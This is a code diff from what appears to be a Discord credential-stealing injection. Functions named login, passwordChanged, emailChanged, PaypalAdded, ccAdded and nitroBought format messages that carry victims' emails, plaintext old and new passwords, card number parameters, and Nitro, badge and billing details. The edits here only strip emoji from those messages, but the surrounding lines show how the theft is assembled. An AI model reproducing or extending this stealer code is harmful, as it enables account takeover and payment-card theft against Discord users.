@@ -661,12 +661,12 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:emoji:1095737774981783676> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: false,
           },
           {
@@ -704,12 +704,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1069997090266173500> Email: **${json.email}**\n <:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n <:blacklock:1069101792736051221> New Password: **${newpassword}**`,
+            value: `Email: **${json.email}**\n Old Password: **${oldpassword}**\n New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1069101795827269632> Nitro Type: **${nitro}**\n <a:blackbadge:1069100354312093798> Badges: **${badges}**\n <a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -747,12 +747,12 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**E-mail Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n <:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `New Email: **${email}**\n Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -795,7 +795,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -838,7 +838,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -883,7 +883,7 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\n Badges: **${badges}**\n Billing: **${billing}**`,
             inline: true,
           },
           {
